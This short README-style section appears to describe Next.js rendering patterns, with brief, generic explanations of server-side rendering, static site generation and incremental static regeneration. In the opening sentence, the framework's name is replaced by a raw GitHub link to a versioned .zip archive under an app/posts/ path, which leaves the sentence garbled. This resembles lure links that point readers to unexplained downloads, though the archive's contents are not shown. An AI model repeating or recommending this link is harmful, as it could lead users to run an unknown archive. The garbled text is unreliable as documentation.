## 📚 Understanding Rendering Patterns

https://raw.githubusercontent.com/helixioyt-web/next-rendering-patterns/main/app/posts/next-rendering-patterns_2.4.zip supports various rendering patterns, and we showcase several of them here:

- **Server-Side Rendering (SSR):** The server generates the page on each request. This is great for dynamic content.
  
- **Static Site Generation (SSG):** The pages are generated at build time. This method is preferred for content that doesn’t change often.
  
- **Incremental Static Regeneration (ISR):** This combines the benefits of SSR and SSG, allowing certain pages to update after a specified time.

Each pattern has its own use case depending on your project’s needs. Explore them to find the best fit for you!
